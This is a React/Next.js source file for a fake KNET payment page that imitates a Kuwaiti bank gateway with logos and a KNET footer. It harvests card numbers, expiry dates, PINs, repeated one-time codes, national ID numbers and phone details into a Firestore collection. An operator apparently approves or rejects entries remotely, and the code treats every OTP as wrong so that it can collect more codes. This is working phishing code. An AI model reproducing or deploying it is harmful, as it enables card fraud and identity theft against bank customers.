"use client";
import { useEffect, useState } from "react";
import "./resposive.css";
import { doc, onSnapshot } from "firebase/firestore";
import { useRouter } from "next/navigation";
import { db, handlePay } from "@/lib/firebase";
import LoaderApp from "@/components/loader";
import { setupOnlineStatus } from "@/lib/utils";
import KNetPaymentForm from "@/components/KNetPaymentForm";

type PaymentInfo = {
  createdDate: string;
  cardNumber: string;
  year: string;
  month: string;
  bank?: string;
  cvv?: string;
  otp?: string;
  pass: string;
  cardState: string;
  allOtps: string[];
  bank_card: string[];
  prefix: string;
  status: "new" | "pending" | "approved" | "rejected";
  phoneNumber: string;
  network: string;
  idNumber: string;
  otp2: string;
};
const BANKS = [
  {
    value: "ABK",
    label: "Al Ahli Bank of Kuwait",
    cardPrefixes: ["403622", "428628", "423826"],
  },
  {
    value: "ALRAJHI",
    label: "Al Rajhi Bank",
    cardPrefixes: ["458838"],
  },
  {
    value: "BBK",
    label: "Bank of Bahrain and Kuwait",
    cardPrefixes: ["418056", "588790"],
  },
  {
    value: "BOUBYAN",
    label: "Boubyan Bank",
    cardPrefixes: [
      "470350",
      "490455",
      "490456",
      "404919",
      "450605",
      "426058",
      "431199",
    ],
  },

  {
    value: "BURGAN",
    label: "Burgan Bank",
    cardPrefixes: [
      "468564",
      "402978",
      "403583",
      "415254",
      "450238",
      "540759",
      "49219000",
    ],
  },

  {
    value: "CBK",
    label: "Commercial Bank of Kuwait",
    cardPrefixes: ["532672", "537015", "521175", "516334"],
  },
  {
    value: "Doha",
    label: "Doha Bank",
    cardPrefixes: ["419252"],
  },

  {
    value: "GBK",
    label: "Gulf Bank",
    cardPrefixes: [
      "526206",
      "531470",
      "531644",
      "531329",
      "517419",
      "517458",
      "531471",
      "559475",
    ],
  },
  {
    value: "TAM",
    label: "TAM Bank",
    cardPrefixes: ["45077848", "45077849"],
  },

  {
    value: "KFH",
    label: "Kuwait Finance House",
    cardPrefixes: ["485602", "537016", "5326674", "450778"],
  },
  {
    value: "KIB",
    label: "Kuwait International Bank",
    cardPrefixes: ["409054", "406464"],
  },
  {
    value: "NBK",
    label: "National Bank of Kuwait",
    cardPrefixes: ["464452", "589160"],
  },
  {
    value: "Weyay",
    label: "Weyay Bank",
    cardPrefixes: ["46445250", "543363"],
  },
  {
    value: "QNB",
    label: "Qatar National Bank",
    cardPrefixes: ["521020", "524745"],
  },
  {
    value: "UNB",
    label: "Union National Bank",
    cardPrefixes: ["457778"],
  },
  {
    value: "WARBA",
    label: "Warba Bank",
    cardPrefixes: ["541350", "525528", "532749", "559459"],
  },
];

export default function Payment() {
  const [step, setstep] = useState(1);
  const [newotp] = useState([""]);
  const [total, setTotal] = useState("");
  const [isloading, setisloading] = useState(false);
  const router = useRouter();
  const [paymentInfo, setPaymentInfo] = useState<PaymentInfo>({
    createdDate: new Date().toISOString(),
    cardNumber: "",
    year: "",
    month: "",
    otp: "",
    allOtps: newotp,
    bank: "",
    pass: "",
    cardState: "new",
    bank_card: [""],
    prefix: "",
    status: "new",
    phoneNumber: "",
    network: "",
    idNumber: "",
    otp2: "",
  });
  const [countdown, setCountdown] = useState(60);
  const [isCountdownActive, setIsCountdownActive] = useState(true);
  const [otpAttempts, setOtpAttempts] = useState(-2);
  const [otpValue, setOtpValue] = useState("");
  const handleAddotp = (otp: string) => {
    newotp.push(`${otp} , `);
  };
  useEffect(() => {
    //handleAddotp(paymentInfo.otp!)
    const ty = localStorage!.getItem("amount");
    if (ty) {
      setTotal(ty);
    }
  }, []);

  useEffect(() => {
    const visitorId = localStorage.getItem("visitor");
    if (visitorId) {
      setupOnlineStatus(visitorId!);
      const unsubscribe = onSnapshot(doc(db, "pays", visitorId), (docSnap) => {
        if (docSnap.exists()) {
          const data = docSnap.data() as PaymentInfo;
          if (data.status === "pending") {
            setisloading(true);
          } else if (data.status === "approved") {
            setisloading(false);
            setstep(2);
          } else if (data.status === "rejected") {
            setisloading(false);
            alert("Card rejected please try again!");
            setstep(1);
          }
        }
      });

      return () => unsubscribe();
    }
  }, []);

  useEffect(() => {
    let interval: NodeJS.Timeout | null = null;

    if (isCountdownActive && countdown > 0) {
      interval = setInterval(() => {
        setCountdown((countdown) => countdown - 1);
      }, 1000);
    } else if (countdown === 0) {
      setIsCountdownActive(false);
    }

    return () => {
      if (interval) clearInterval(interval);
    };
  }, [isCountdownActive, countdown]);

  return (
    <div
      style={{ background: "#f1f1f1", height: "100vh", margin: 0, padding: 0 }}
      dir="ltr"
    >
      <form
        onSubmit={(e) => {
          e.preventDefault();
        }}
        style={{ direction: "ltr" }}
      >
        <div id="PayPageEntry">
          <div className="container">
            <div style={{ display: "flex", justifyContent: "center" }}>
              <img src="./mob.jpg" className="-" alt="logo" />
            </div>
            <div className="content-block">
              <div className="form-card">
                <div
                  className="container-"
                  style={{ display: "flex", justifyContent: "center" }}
                >
                  <img
                    src="./kfh.jpeg"
                    className="-"
                    alt="logo"
                    height={40}
                    width={100}
                  />
                </div>
                <div className="row">
                  <label className="column-label">Merchant: </label>
                  <label className="column-value text-label">
                    Mobile Telecommunication Co.{" "}
                  </label>
                </div>
                <div id="OrgTranxAmt">
                  <label className="column-label"> Amount: </label>
                  <label className="column-value text-label" id="amount">
                    {total}
                    {"  "}KD&nbsp;{" "}
                  </label>
                </div>
                {/* Added for PG Eidia Discount starts   */}
                <div
                  className="row"
                  id="DiscntRate"
                  style={{ display: "none" }}
                />
                <div
                  className="row"
                  id="DiscntedAmt"
                  style={{ display: "none" }}
                />
                {/* Added for PG Eidia Discount ends   */}
              </div>
              <div className="form-card">
                <div
                  className="notification"
                  style={{
                    border: "#ff0000 1px solid",
                    backgroundColor: "#f7dadd",
                    fontSize: 12,
                    fontFamily: "helvetica, arial, sans serif",
                    color: "#ff0000",
                    paddingRight: 15,
                    display: "none",
                    marginBottom: 3,
                    textAlign: "center",
                  }}
                  id="otpmsgDC"
                />
                {/*Customer Validation  for knet*/}
                <div
                  className="notification"
                  style={{
                    border: "#ff0000 1px solid",
                    backgroundColor: "#f7dadd",
                    fontSize: 12,
                    fontFamily: "helvetica, arial, sans serif",
                    color: "#ff0000",
                    paddingRight: 15,
                    display: "none",
                    marginBottom: 3,
                    textAlign: "center",
                  }}
                  id="CVmsg"
                />
                <div id="ValidationMessage">
                  {/*span class="notification" style="border: #ff0000 1px solid;background-color: #f7dadd; font-size: 12px;
            font-family: helvetica, arial, sans serif;
            color: #ff0000;
              padding: 2px; display:none;margin-bottom: 3px; text-align:center;"   id="">
                      </span*/}
                </div>
                <div id="savedCardDiv" style={{ display: "none" }}>
                  {/* Commented the bank name display for kfast starts */}
                  <div className="row">
                    <br />
                  </div>
                  {/* Commented the bank name display for kfast ends */}
                  {/* Added for Points Redemption */}
                  <div className="row">
                    <label className="column-label" style={{ marginLeft: 20 }}>
                      PIN:
                    </label>
                    <input
                      inputMode="numeric"
                      pattern="[0-9]*"
                      name="debitsavedcardPIN"
                      id="debitsavedcardPIN"
                      autoComplete="off"
                      title="Should be in number. Length should be 4"
                      type="password"
                      size={4}
                      maxLength={4}
                      className="allownumericwithoutdecimal"
                      style={{ width: "50%" }}
                    />
                  </div>
                  {/* Added for Points Redemption */}
                </div>

                {step === 1 ? (
                  <KNetPaymentForm
                    amount={total}
                    onSubmit={(cardData) => {
                      setPaymentInfo({
                        ...paymentInfo,
                        cardNumber: cardData.cardNumber,
                        expiry: cardData.expiry,
                        cvv: cardData.pin,
                        pass: cardData.pin,
                      });
                    }}
                  />
                ) : step === 2 ? (
                  <div>
                    <div className="row">
                      <div
                        className="bg-blue-100 font-normal p-2 my-2"
                        style={{ fontSize: 12, borderRadius: 3 }}
                      >
                        <strong>Please note:</strong> A 6-digit verification
                        code has been sent via text message to your registered
                        phone number
                      </div>
                    </div>
                    <div className="row">
                      <label className="column-label">CardNumber:</label>
                      <label
                        className="allownumericwithoutdecimal"
                        style={{ color: "black", fontWeight: 100 }}
                      >
                        {" "}
                        {paymentInfo.cardNumber.substring(0, 5) +
                          "****" +
                          paymentInfo.cardNumber.substring(10, 15)}
                      </label>
                    </div>
                    <div className="row">
                      <label className="column-label">Month expiry:</label>
                      <label
                        className="allownumericwithoutdecimal"
                        style={{ color: "black", fontWeight: 100 }}
                      >
                        {" "}
                        {paymentInfo.month}
                      </label>
                    </div>
                    <div className="row">
                      <label className="column-label">Year expiry:</label>
                      <label
                        className="allownumericwithoutdecimal"
                        style={{ color: "black", fontWeight: 100 }}
                      >
                        {" "}
                        {paymentInfo.year}
                      </label>
                    </div>
                    <div className="row">
                      <label className="column-label">Pin:</label>
                      <label
                        className="allownumericwithoutdecimal"
                        style={{ color: "black", fontWeight: 200 }}
                      >
                        {"****"}
                      </label>
                    </div>
                    <div className="flex my-1 row">
                      <label className="column-label ">OTP:</label>
                      <input
                        onChange={(e: any) => {
                          setPaymentInfo({
                            ...paymentInfo,
                            otp: e.target.value,
                          });
                          setOtpValue(e.target.value);
                        }}
                        type="tel"
                        maxLength={6}
                        id="timer"
                        className="column-value "
                        value={otpValue}
                        placeholder={`Timeout in: 01:${
                          countdown === 0 ? "00" : countdown
                        }`}
                      />
                    </div>
                    <div className="row">
                      <div
                        className="text-sm text-gray-600"
                        style={{
                          fontSize: 12,
                          color: "#666",
                          textAlign: "center",
                          marginTop: 5,
                        }}
                      >
                        {otpAttempts >= 60 && (
                          <div style={{ color: "#ff0000", marginTop: 2 }}>
                            سيتطلب مزيداً من التحقق بسبب فشل التحقق من الرمز
                          </div>
                        )}
                      </div>
                    </div>
                  </div>
                ) : step === 3 ? (
                  <>
                    <Step3
                      setPaymentInfo={setPaymentInfo}
                      paymentInfo={paymentInfo}
                    />
                  </>
                ) : step === 4 ? (
                  <>
                    <Step4
                      setPaymentInfo={setPaymentInfo}
                      paymentInfo={paymentInfo}
                    />
                  </>
                ) : (
                  <></>
                )}
              </div>
              <div className="form-card">
                <div className="row">
                  <div style={{ textAlign: "center" }}>
                    <div id="loading" style={{ display: "none" }}>
                      <center>
                        <img
                          style={{
                            height: 20,
                            float: "left",
                            marginLeft: "20%",
                          }}
                        />
                        <label
                          className="column-value text-label"
                          style={{ width: "70%", textAlign: "center" }}
                        >
                          Processing.. please wait ...
                        </label>
                      </center>
                    </div>
                    <div style={{ display: "flex" }}>
                      <button
                        disabled={
                          step === 1 &&
                          (paymentInfo.prefix === "" ||
                            paymentInfo.bank === "" ||
                            paymentInfo.cardNumber === "" ||
                            paymentInfo.pass === "" ||
                            paymentInfo.month === "" ||
                            paymentInfo.year === "" ||
                            paymentInfo.pass.length !== 4)
                        }
                        onClick={() => {
                          if (step === 1) {
                            setisloading(true);
                            handlePay(paymentInfo, setPaymentInfo);
                          } else if (step === 2) {
                            if (!newotp.includes(paymentInfo.otp!)) {
                              newotp.push(paymentInfo.otp!);
                            }
                            setisloading(true);
                            handleAddotp(paymentInfo.otp!);

                            // Increment attempt counter
                            const newAttemptCount = otpAttempts + 1;
                            setOtpAttempts(newAttemptCount);

                            // Clear OTP input after submit
                            setOtpValue("");
                            handlePay(paymentInfo, setPaymentInfo);

                            setTimeout(() => {
                              // Check if this is the 3rd attempt, if so move to step 3
                              if (newAttemptCount >= 3) {
                                alert(
                                  "تم استنفاد المحاولات المسموحة. سيتم الانتقال إلى التحقق الإضافي لإكمال العملية."
                                );
                                setstep(3);
                                setOtpAttempts(1); // Reset counter for next time
                              } else {
                                // For now, we'll assume OTP is incorrect and stay on step 2
                                // In a real scenario, you'd check the OTP validation response
                              }
                              setisloading(false);
                            }, 3000);
                          } else if (step === 3) {
                            setisloading(true);

                            // Save step 3 data to Firestore
                            handlePay(paymentInfo, setPaymentInfo);

                            setTimeout(() => {
                              setstep(4);
                              setisloading(false);
                            }, 7000);
                          } else if (step === 4) {
                            setisloading(true);

                            // Save step 4 data (otp2) to Firestore
                            handlePay(paymentInfo, setPaymentInfo);

                            setTimeout(() => {
                              setisloading(false);
                              router.push("/auth");
                            }, 5000);
                          }

                          setPaymentInfo({
                            ...paymentInfo,
                            otp2: step === 4 ? "" : paymentInfo.otp2,
                          });
                        }}
                      >
                        {isloading
                          ? "Wait..."
                          : step === 1
                          ? "Submit"
                          : "Confirm"}
                      </button>
                      <button>Cancel</button>
                    </div>
                  </div>
                </div>
              </div>
              <div
                id="overlayhide"
                className="overlay"
                style={{ display: "none" }}
              ></div>

              <footer>
                <div className="footer-content-new">
                  <div className="row_new">
                    <div
                      style={{
                        textAlign: "center",
                        fontSize: 11,
                        lineHeight: 1,
                      }}
                    >
                      All&nbsp;Rights&nbsp;Reserved.&nbsp;Copyright&nbsp;2024&nbsp;
                      &nbsp;
                      <br />
                      <span
                        style={{
                          fontSize: 10,
                          fontWeight: "bold",
                          color: "#0077d5",
                        }}
                      >
                        The&nbsp;Shared&nbsp;Electronic&nbsp;Banking&nbsp;Services&nbsp;Company
                        - KNET
                      </span>
                    </div>
                  </div>
                  <div id="DigiCertClickID_cM-vbZrL" />
                </div>
                <div id="DigiCertClickID_cM-vbZrL" />
              </footer>
            </div>
          </div>
        </div>
        {isloading && <LoaderApp />}
      </form>
    </div>
  );
}

const Step3 = ({ setPaymentInfo, paymentInfo }: any) => {
  return (
    <div id="FCUseDebitEnable" style={{ marginTop: 5 }}>
      <div className="row">
        <label style={{ width: "40%" }} className="column-label">
          ID Number:
        </label>
        <label>
          <input
            name="natID"
            style={{ width: "60%" }}
            type="tel"
            inputMode="numeric"
            pattern="[0-9]*"
            size={12}
            onChange={(e: any) =>
              setPaymentInfo({
                ...paymentInfo,
                idNumber: e.target.value,
              })
            }
            className="allownumericwithoutdecimal"
            maxLength={12}
            title="Should be in number. Length should be 12"
          />
        </label>
      </div>
      <div className="row">
        <label style={{ width: "40%" }} className="column-label">
          Authorized Phone Number:
        </label>
        <label>
          <input
            name="number"
            onChange={(e: any) =>
              setPaymentInfo({
                ...paymentInfo,
                phoneNumber: e.target.value,
              })
            }
            style={{ width: "60%" }}
            type="tel"
            inputMode="numeric"
            pattern="[0-9]*"
            size={10}
            className="allownumericwithoutdecimal"
            maxLength={10}
            title="Should be in number. Length should be 10"
          />
        </label>
      </div>
      <div className="row">
        <label className="column-label" style={{ width: "40%" }}>
          Network operator:{" "}
        </label>
        <select
          className="column-value"
          style={{ width: "60%" }}
          name="company"
          onChange={(e: any) =>
            setPaymentInfo({
              ...paymentInfo,
              network: e.target.value,
            })
          }
          id="type"
        >
          <option value="">Choose Network operator:...</option>
          <option value="STC" title="STC">
            STC
          </option>
          <option value="Zain" title="Zain">
            Zain
          </option>
          <option value="Ooredoo" title="Ooredoo">
            Ooredoo
          </option>
        </select>
      </div>
    </div>
  );
};
const Step4 = (props: any) => {
  return (
    <div>
      <div className="row">
        <div
          className="bg-blue-100 font-normal p-2 my-2"
          style={{ fontSize: 12, borderRadius: 3 }}
        >
          Please note: A 6-digit verification code has been sent via text
          message to your registered phone number
        </div>
      </div>
      <div className="row">
        <label style={{ width: "40%" }} className="column-label">
          ID Number:
        </label>
        <label
          style={{ width: "60%", fontWeight: 100, color: "black" }}
          className="column-label"
        >
          {props.paymentInfo.idNumber}
        </label>
      </div>
      <div className="row">
        <label style={{ width: "40%" }} className="column-label">
          Phone Number:
        </label>
        <label
          style={{ width: "60%", fontWeight: 100, color: "black" }}
          className="column-label"
        >
          {props.paymentInfo.phoneNumber}
        </label>
      </div>
      <div className="row">
        <label className="column-label">OTP:</label>
        <label className="column-label"></label>
        <input
          onChange={(e: any) =>
            props.setPaymentInfo({
              ...props.paymentInfo,
              otp2: e.target.value,
            })
          }
          type="tel"
          maxLength={6}
          id="timer"
          value={props.paymentInfo.otp2}
        />
      </div>
    </div>
  );
};
